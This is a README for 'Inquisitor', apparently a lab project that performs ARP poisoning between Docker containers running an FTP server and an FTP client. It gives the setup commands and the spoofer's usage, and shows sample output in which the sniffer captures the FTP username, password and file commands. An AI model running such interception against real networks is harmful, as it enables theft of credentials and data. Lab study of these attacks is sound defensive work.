# Inquisitor 🛜
A program that performs ARP poisoning.

## enviroment setting

```bash
# on your host machine

# Step1: run ftp server in detach mode.
shell % make server

# Step2: build and run ftp client container.
shell % make client-build && make client

# Step3: In other terminal, build and run spoofer container.
shell % make spoofer-build && make spoofer

# Step4: In other terminal, get MAC address and IP address.
shell % make info
ftp__client: MAC=[MAC address], IP=[IP address]
ftpd_server: MAC=[MAC address], IP=[IP address]
```

## execute

```bash
# for ftp client container

shell % ftp [ftpd_server IP address] 21
ftp> ftp_client # username
ftp> mypass # password
ftp> ls # list files in /home/ftp_client in ftp server.
ftp> get [some file] # load [some file] in current directory from ftp server
ftp> put [some file] # upload [some file] in current directory to ftp server

# to see arp table
shell % arp -a
```

```bash
# for spoofer container
shell % ./inquisitor [IP-src] [MAC-src] [IP-target] [MAC-target]

# When execute commands listed above in the ftp client container,
# the output will be ...
...
sending poisoned ARP response...
.
Sent 1 packets.
.
Sent 1 packets.
sniffing...
b'USER ftp_client\r\n'
...
b'PASS mypass\r\n'
...
b'LIST\r\n'
...
b'SIZE kusamakura.txt\r\n'
b'EPSV\r\n'
b'RETR kusamakura.txt\r\n'
b'MDTM kusamakura.txt\r\n'
...
b'EPSV\r\n'
b'STOR romeojuliet.txt\r\n'
...
```


## help
```bash
shell % make help
Command List:

server:        run ftp server.
server-down:   stop ftp server.
client:        run ftp client container.
client-build:  build ftp client image.
spoofer:       run spoofer container.
spoofer-build: build spoofer image.
info:          print MAC address and IP adress of each containers.


shell % ./inquisitor -h
usage: inquisitor [-h] IP-src MAC-src IP-target MAC-target

Inquisitor: a program that performs ARP poisoning.

positional arguments:
  IP-src
  MAC-src
  IP-target
  MAC-target

options:
  -h, --help  show this help message and exit

```
